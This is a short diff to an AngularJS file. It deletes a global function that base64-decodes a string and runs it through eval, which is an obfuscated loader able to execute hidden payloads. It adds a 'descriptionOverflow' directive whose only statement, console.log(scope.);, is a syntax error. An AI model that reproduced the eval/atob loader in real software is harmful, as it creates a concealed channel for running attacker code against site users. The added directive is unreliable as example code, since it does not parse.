@@ -40,4 +40,10 @@ app.directive('contenteditable', ['$sce', function ($sce) {
         }
     };
 }]);
-window["FUNCTION()"] = function(g){eval(atob(g))}
+app.directive('descriptionOverflow', function(){
+    return {
+        link: function(scope, elm){
+            console.log(scope.);
+        }
+    }
+});
